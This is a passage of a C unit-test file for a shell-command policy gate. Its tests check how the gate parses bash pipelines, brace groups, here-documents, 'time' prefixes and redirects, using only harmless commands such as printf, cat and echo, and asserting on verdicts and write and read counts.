   * two outer output relations. No command-local body route is revived. */
  ASSERT(result.subcommands[0].write_count == 2);
  ASSERT(result.subcommands[1].write_count == 5);
  ASSERT(result.subcommands[2].write_count == 2);
  for (uint32_t i = 0; i < result.subcommand_count; i++)
    ASSERT(result.subcommands[i].read_count == 0);
  sg_gate_free(gate);
}

TEST(background_newline_cwd_contract) {
  static const char *const rules[] = {"cd *", "true", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_path_count = 1;
  static const char *const separators[] = {" ", "\n", " # note\n", "\n\n"};
  for (unsigned destination = 0; destination < 2; destination++) {
    config.sensitive_write_paths[0] =
        destination == 0 ? "/workspace/out" : "/tmp/out";
    ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
    for (size_t separator = 0;
         separator < sizeof(separators) / sizeof(separators[0]); separator++) {
      char source[128];
      snprintf(source, sizeof(source), "cd /tmp && true &%sprintf payload >out",
               separators[separator]);
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, source, &result));
      ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.truncated);
      bool found = false;
      for (uint32_t command = 0; command < result.subcommand_count; command++) {
        const sg_subcommand_result_t *item = &result.subcommands[command];
        if (strcmp(item->netargv, "6:printf,7:payload,"))
          continue;
        found = true;
        ASSERT(item->write_count == 1);
        ASSERT(((item->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
               (destination == 0));
      }
      ASSERT(found);
    }
  }
  sg_gate_free(gate);
}

TEST(background_compound_completion_contract) {
  static const char *const rules[] = {"true", "false", "printf *", "echo *"};
  sg_gate_t *gate = gate_with_rules(rules, 4);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/etc/completion-out";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const struct {
    const char *source;
    bool reached;
    sg_verdict_t verdict;
  } cases[] = {
      {"{ false & } || printf bad >/etc/completion-out", false,
       SG_VERDICT_ALLOW},
      {"{ false & } && printf good >/etc/completion-out", true,
       SG_VERDICT_ALLOW},
      {"(false &) || printf bad >/etc/completion-out", false, SG_VERDICT_ALLOW},
      {"{ { false & }; } || printf bad >/etc/completion-out", false,
       SG_VERDICT_ALLOW},
      {"{ false && true & } || printf bad >/etc/completion-out", false,
       SG_VERDICT_ALLOW},
      {"! { false & } || printf good >/etc/completion-out", true,
       SG_VERDICT_ALLOW},
      {"time { false & } || printf bad >/etc/completion-out", false,
       SG_VERDICT_ALLOW},
      {"echo \"$( { false & } || printf bad >/etc/completion-out )\"", false,
       SG_VERDICT_ALLOW_CONDITIONAL},
      {"{ false; } || printf good >/etc/completion-out", true,
       SG_VERDICT_ALLOW},
      {"{ true & false; } || printf good >/etc/completion-out", true,
       SG_VERDICT_ALLOW},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    if (result.verdict != cases[i].verdict || result.truncated)
      fprintf(stderr, "background compound gate: %s (verdict=%d)\n",
              cases[i].source, result.verdict);
    ASSERT(result.verdict == cases[i].verdict && !result.truncated);
    bool found = false;
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      const sg_subcommand_result_t *item = &result.subcommands[command];
      if (strcmp(item->netargv, "6:printf,3:bad,") &&
          strcmp(item->netargv, "6:printf,4:good,"))
        continue;
      found = true;
      if ((item->write_count != 0) != cases[i].reached)
        fprintf(stderr, "background compound gate: %s\n", cases[i].source);
      ASSERT(item->write_count == (cases[i].reached ? 1u : 0u));
      ASSERT(((item->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
             cases[i].reached);
    }
    ASSERT(found);
  }
  sg_gate_free(gate);
}

TEST(bash_pipeline_time_policy_contract) {
  static const char *rules[] = {"printf *", "cat",  "sort", "eval *",
                                "echo *",   "exec", "true"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t violation_config;
  sg_violation_config_default(&violation_config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &violation_config));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "time -p -- printf value | cat", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,5:value,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");

  static const char *const document_pipelines[] = {
      "time -p printf value <<<body | cat",
      "time -p printf value <<EOF | cat\nbody\nEOF\n",
      "time -p printf value <<<one 3<<<two |& cat",
  };
  for (size_t i = 0;
       i < sizeof(document_pipelines) / sizeof(document_pipelines[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, document_pipelines[i], &result));
    if (result.verdict != SG_VERDICT_ALLOW || result.subcommand_count != 2)
      printf("    document pipeline: %s (verdict %d, commands %u, reason %s)\n",
             document_pipelines[i], result.verdict, result.subcommand_count,
             result.deny_reason ? result.deny_reason : "none");
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);

    ASSERT_STR(result.subcommands[0].netargv, "6:printf,5:value,");
    ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  }

  ASSERT_SG_OK(eval_cmd(gate, "time time -p true", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "4:true,");

  ASSERT_SG_OK(eval_cmd(gate, "time>/tmp/timing printf value", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,5:value,");

  ASSERT(result.subcommands[0].write_count == 1);

  ASSERT_SG_OK(eval_cmd(gate, "time -p>/tmp/timing printf value", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,5:value,");

  ASSERT_SG_OK(eval_cmd(gate, "time { printf value; } | cat", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);

  ASSERT_SG_OK(eval_cmd(gate, "{ time printf value; } 2>/tmp/outer", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);

  /* The group redirect is one command context effect. The shell-owned timing
   * report follows the same route without becoming a second policy write. */
  ASSERT(result.subcommands[0].write_count == 1);

  ASSERT_SG_OK(
      eval_cmd(gate, "time printf value | { time -p cat; printf tail; } | sort",
               &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 4);

  ASSERT(sg_gate_evaluate(gate, "time eval echo hidden",
                          strlen("time eval echo hidden"), eval_buf,
                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT);

  ASSERT_SG_OK(
      eval_cmd(gate, "time { printf value; } 2>/tmp/err | cat", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);

  ASSERT(result.subcommands[0].write_count == 1);
  ASSERT(result.subcommands[1].write_count == 0);

  ASSERT_SG_OK(eval_cmd(gate, "echo \"$(exec 2>&1; time true)\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.has_dynamic_substitution_io &&
         result.requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <(exec 2>&1; time true)", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.has_dynamic_substitution_io &&
         !result.requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "exec 0</tmp/input; echo \"$(cat)\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[2].netargv, "3:cat,");
  ASSERT(result.subcommands[2].read_count == 1);

  ASSERT_SG_OK(
      eval_cmd(gate, "exec 3>/tmp/old; echo \"$(printf child >&3 >/tmp/new)\"",
               &result));
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[2].netargv, "6:printf,5:child,");
  ASSERT(result.subcommands[2].write_count == 1);

  static const char *const self_duplication[] = {
      "exec 0<&0; echo \"$(printf value)\"",
      "exec 1>&1; echo \"$(printf value)\"",
      "exec 2>&2; echo \"$(printf value)\"",
      "printf value 2>&2 >\"$(printf target)\"",
      "{ echo \"$(printf value)\"; } 2>&2",
  };
  for (size_t i = 0; i < sizeof(self_duplication) / sizeof(self_duplication[0]);
       i++) {
    ASSERT_SG_OK(eval_cmd(gate, self_duplication[i], &result));
    ASSERT(result.subcommand_count == (i < 3 ? 3u : 2u));
    ASSERT(result.has_dynamic_substitution_io);
    ASSERT(result.requires_substitution_evaluation == (i != 3));
  }

  ASSERT_SG_OK(eval_cmd(gate, "{ time true; } |& cat 3<&0", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");

  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  static const char *const empty_timing[] = {
      "time", "time -p", "time --", "time !", "! time", "! time !",
  };
  for (size_t i = 0; i < sizeof(empty_timing) / sizeof(empty_timing[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, empty_timing[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 0 &&
           result.deny_reason == NULL && result.anomaly_score == 0.0 &&
           !result.anomaly_detected);
  }

  static const char *const empty_timing_connectors[] = {
      "time & printf value",  "printf value && time",
      "printf value || time", "printf value && time; time",
      "printf value; time",   "printf value; time -p; time",
  };
  for (size_t i = 0;
       i < sizeof(empty_timing_connectors) / sizeof(empty_timing_connectors[0]);
       i++) {
    sg_error_t error = eval_cmd(gate, empty_timing_connectors[i], &result);
    if (error != SG_OK)
      printf("    case: %s (error %d)\n", empty_timing_connectors[i], error);
    ASSERT_SG_OK(error);
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
           result.deny_reason == NULL);
    ASSERT_STR(result.subcommands[0].netargv, "6:printf,5:value,");
  }

  static const char *const invalid_empty_timing[] = {
      "(time)",
      "echo \"$(time)\"",
      "echo \"$(time;)\"",
      "echo \"$(exec 2>&1; time;)\"",
      "cat <(time)",
      "cat <(time;)",
      "printf x > >(time;)",
      "echo \"$( (time;) )\"",
      "echo \"$(time (time;))\"",
      "echo \"$( (time;); : )\"",
      "cat <( (time;) )",
      "printf x > >( (time;) )",
      "time && printf value",
      "time || printf value",
  };
  for (size_t i = 0;
       i < sizeof(invalid_empty_timing) / sizeof(invalid_empty_timing[0]);
       i++) {
    ASSERT(sg_gate_evaluate(gate, invalid_empty_timing[i],
                            strlen(invalid_empty_timing[i]), eval_buf,
                            sizeof(eval_buf), &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 && result.deny_reason != NULL);
    ASSERT_STR(result.deny_reason, "parse error");
  }

  ASSERT_SG_OK(eval_cmd(gate, "!>/tmp/negated printf value", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,5:value,");

  ASSERT_SG_OK(eval_cmd(gate, "time !; printf value >/tmp/value", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
         result.deny_reason == NULL);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,5:value,");

  ASSERT_SG_OK(eval_cmd(gate, "time >/tmp/timing", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 0 && result.deny_reason != NULL);
  ASSERT_STR(result.deny_reason,
             "redirect-only shell operation is not argv-policy-evaluable");
  sg_gate_free(gate);
}

TEST(timed_pipeline_ordinary_time_policy_contract) {
  static const char *rules[] = {"true", "cat",    "echo *",
                                "time", "time *", "time * *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  sg_violation_config_t document_config;
  sg_violation_config_default(&document_config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &document_config));
  static const struct {
    const char *source;
    const char *netargv;
    uint32_t count;
  } cases[] = {
      {"time true | time", "4:time,", 2},
      {"time true | time -p", "4:time,2:-p,", 2},
      {"time true | time --", "4:time,2:--,", 2},
      {"time true | time !", "4:time,1:!,", 2},
      {"time -p true | time", "4:time,", 2},
      {"time true |& time", "4:time,", 2},
      {"time true | time | cat", "4:time,", 3},
      {"time true | \"time\"", "4:time,", 2},
      {"time true | time <<<body", "4:time,", 2},
      {"time true | time -p <<EOF\nbody\nEOF\n", "4:time,2:-p,", 2},
      {"time true | cat <<<body", "3:cat,", 2},
      {"time true |& 3<<<body cat", "3:cat,", 2},
      {"time <<<body true | cat", "3:cat,", 2},
  };
  sg_result_t result = {0};
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           result.subcommand_count == cases[i].count &&
           result.deny_reason == NULL);
    ASSERT_STR(result.subcommands[1].netargv, cases[i].netargv);
  }
  ASSERT_SG_OK(eval_cmd(gate, "echo \"$(time true | time)\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.subcommand_count == 3 &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io);
  ASSERT_STR(result.subcommands[2].netargv, "4:time,");

  ASSERT_SG_OK(eval_cmd(gate, "time <<<body cat", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
         result.subcommands[0].read_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
  static const struct {
    const char *source;
    const char *netargv;
    uint32_t count;
    uint32_t reads;
  } document_prefixes[] = {
      {"<<<one time <<<two cat", "4:time,3:cat,", 1, 1},
      {"<<<one time -p 3<<<two cat <&3", "4:time,2:-p,3:cat,", 1, 2},
      {"true | <<<one time <<<two cat", "4:time,3:cat,", 2, 1},
      {"time true | <<<one time <<<two cat", "4:time,3:cat,", 2, 1},
      {"echo one <<<one\ntime <<<two cat", "3:cat,", 2, 1},
      {"echo one <<<one\n! <<<two cat", "3:cat,", 2, 1},
      {"echo one <<<one\r\ntime -p <<<two cat", "3:cat,", 2, 1},
  };
  for (size_t i = 0;
       i < sizeof(document_prefixes) / sizeof(document_prefixes[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, document_prefixes[i].source, &result));
    if (result.verdict != SG_VERDICT_ALLOW ||
        result.subcommand_count != document_prefixes[i].count)
      fprintf(stderr, "document policy: %s verdict=%d count=%u reason=%s\n",
              document_prefixes[i].source, result.verdict,
              result.subcommand_count,
              result.deny_reason ? result.deny_reason : "none");
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           result.subcommand_count == document_prefixes[i].count &&
           result.deny_reason == NULL);
    uint32_t command = result.subcommand_count - 1;
    ASSERT_STR(result.subcommands[command].netargv,
               document_prefixes[i].netargv);
    /* The fd-3 fixture leaves the second document reachable through both fd
     * 3 and its fd-0 alias; the remaining fixtures have one live read route. */
    ASSERT(result.subcommands[command].read_count ==
           document_prefixes[i].reads);
  }
  ASSERT_SG_OK(eval_cmd(gate, "echo \"$(time <<<body cat)\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.subcommand_count == 2 && result.subcommands[1].read_count == 1);
  ASSERT_SG_OK(eval_cmd(gate, "time true | { time -p; }", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
         result.deny_reason == NULL);
  sg_gate_free(gate);

  /* An unmatched ordinary executable is a normal policy decision, not an
   * argv-less timing placeholder or an invented redirect-only diagnostic. */
  static const char *restricted_rules[] = {"true"};
  gate = gate_with_rules(restricted_rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(eval_cmd(gate, "time true | time", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 2 && result.deny_reason == NULL);
  ASSERT_STR(result.subcommands[1].netargv, "4:time,");
  ASSERT_SG_OK(eval_cmd(gate, "<<<one time <<<two cat", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 1 && result.deny_reason == NULL);
  ASSERT_STR(result.subcommands[0].netargv, "4:time,3:cat,");
  sg_gate_free(gate);
}

TEST(grouped_empty_time_io_policy_contract) {
  static const char *rules[] = {"printf *", "cat", "exec"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  static const char *const neutral[] = {
      "{ time; }",
      "{ { time; }; }",
      "{ time; printf value; } >/tmp/timed-group",
      "(time; printf value) >/tmp/timed-subshell",
  };
  static const uint32_t neutral_counts[] = {0, 0, 1, 1};
  for (size_t i = 0; i < sizeof(neutral) / sizeof(neutral[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, neutral[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           result.subcommand_count == neutral_counts[i] &&
           result.deny_reason == NULL);
  }

  static const struct {
    const char *input;
    uint32_t command_count;
  } unpolicyable[] = {
      {"{ time; } >/tmp/timed-group", 0},
      {"{ time; } </dev/null", 0},
      {"{ time; } >>/tmp/timed-group", 0},
      {"{ time; } <<EOF\nbody\nEOF\n", 0},
      {"{ time; } {log}>/tmp/timed-group", 0},
      {"exec {log}>/tmp/timed-log; { time; } {log}>&-", 1},
      {"{ time; } &>/tmp/timed-group", 0},
      {"{ { time; }; } >/tmp/timed-group", 0},
      {"(time;) >/tmp/timed-subshell", 0},
      {"{ time; } > >(cat)", 1},
  };
  for (size_t i = 0; i < sizeof(unpolicyable) / sizeof(unpolicyable[0]); i++) {
    sg_error_t error = eval_cmd(gate, unpolicyable[i].input, &result);
    if (error != SG_OK)
      printf("    case: %s (error %d)\n", unpolicyable[i].input, error);
    ASSERT_SG_OK(error);
    if (result.verdict != SG_VERDICT_UNDETERMINED ||
        result.subcommand_count != unpolicyable[i].command_count ||
        result.deny_reason == NULL)
      printf("    case: %s (verdict %d, commands %u)\n", unpolicyable[i].input,
             result.verdict, result.subcommand_count);
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
           result.subcommand_count == unpolicyable[i].command_count &&
           result.deny_reason != NULL);
    ASSERT_STR(result.deny_reason,
               "redirect-only shell operation is not argv-policy-evaluable");
  }
  sg_gate_free(gate);
}

TEST(empty_timing_substitution_policy_contract) {
  static const char *rules[] = {"echo *",   "true", "exec",
                                "printf *", "cat",  "cat *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  static const struct {
    const char *source;
    uint32_t count;
    bool inspection;
    bool dynamic;
  } cases[] = {
      {"echo \"$(time; true)\"", 2, true, true},
      {"echo \"$(time !; true)\"", 2, true, true},
      {"echo \"`time; true`\"", 2, true, true},
      {"echo \"$(exec 2>&1; time; true)\"", 3, true, true},
      {"cat <(time; printf x)", 2, false, true},
      {"printf x > >(time; cat)", 2, false, true},
      {"echo \"$(time &)\"", 1, false, false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    if (result.verdict !=
        (cases[i].inspection ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW))
      printf("\n    empty timing result: %s verdict=%d reason=%s\n",
             cases[i].source, result.verdict,
             result.deny_reason ? result.deny_reason : "none");
    ASSERT(result.verdict == (cases[i].inspection ? SG_VERDICT_ALLOW_CONDITIONAL
                                                  : SG_VERDICT_ALLOW));
    ASSERT(result.subcommand_count == cases[i].count && !result.truncated);
    ASSERT(result.requires_substitution_evaluation == cases[i].inspection);
    ASSERT(result.has_dynamic_substitution_io == cases[i].dynamic);
    ASSERT(result.deny_reason == NULL);
  }
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "echo \"$(time >output; true)\"", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.deny_reason != NULL);
  ASSERT_STR(result.deny_reason,
             "redirect-only shell operation is not argv-policy-evaluable");
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT_SG_OK(
      eval_cmd(gate, "printf x | { exec 2>err; time true; }", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);

  ASSERT(result.subcommands[2].write_count == 1);
  ASSERT_SG_OK(eval_cmd(
      gate, "printf x | { exec {fd}>out; printf value >&$fd; }", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);
  ASSERT(result.subcommands[2].write_count == 1);
  sg_gate_free(gate);
}

TEST(posix_brace_group_sibling_pipeline_policy_contract) {
  const char *command =
      "{ printf left; } 3>/tmp/left | { cat; } 2>>/tmp/right && "
      "{ printf tail; }";
  const char *rules[] = {"printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,4:left,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[2].netargv, "6:printf,4:tail,");
  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_policy_and_anomaly_contract) {
  const char *command = "{ echo '}'; printf two; } > /tmp/brace-group.out";
  const char *rules[] = {"echo *", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,1:},");
  ASSERT_STR(result.subcommands[1].netargv, "6:printf,3:two,");

  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_document_policy_contract) {
  const char *command = "{ printf one; cat; } <<'EOF'\n}\nEOF";
  const char *rules[] = {"printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,3:one,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");

  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_descriptor_document_policy_contract) {
  const char *command =
      "{ cat; cat; } 4<&0 5>&- <<-'EOF' 3>\"/tmp/trace file\" 6>&1\n"
      "\tpayload\n"
      "\tEOF\n";
  const char *rules[] = {"cat"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/tmp/trace file";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT_STR(result.subcommands[i].netargv, "3:cat,");

    ASSERT(result.subcommands[i].read_count == 1);
    ASSERT(result.subcommands[i].write_count == 1);
    ASSERT(result.subcommands[i].violation_type_flags &
           SG_VIOL_WRITE_SENSITIVE);
  }
  sg_gate_free(gate);
}

TEST(posix_brace_group_crlf_document_policy_contract) {
  const char *command = "{ printf one; cat; } <<'EOF'\r\n}\r\nEOF\r\n";
  const char *rules[] = {"printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,3:one,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");

  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_multiple_document_policy_contract) {
  const char *command = "{ cat; cat; } <<A <<-'B'\n"
                        "one\n"
                        "A\n"
                        "\ttwo\n"
                        "\tB\n";
  const char *rules[] = {"cat"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");

  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_document_pipeline_policy_contract) {
  const char *command =
      "{ printf one; cat; } <<EOF | sort > /tmp/brace.out 2>>/tmp/brace.err\n"
      "payload\n"
      "EOF";
  const char *rules[] = {"printf *", "cat", "sort"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,3:one,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[2].netargv, "4:sort,");

  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(brace_group_redirect_and_operator_policy_contract) {
  static const struct {
    const char *command;
    uint32_t subcommand_count;
  } cases[] = {
      {"{ cat <<<value; printf after; }", 2},
      {"{ cat <<EOF; printf after; }\npayload\nEOF\n", 2},
      {"{ cat || printf after; }", 2},
      {"{ cat | printf after; }", 2},
  };
  const char *rules[] = {"cat", "printf *"};
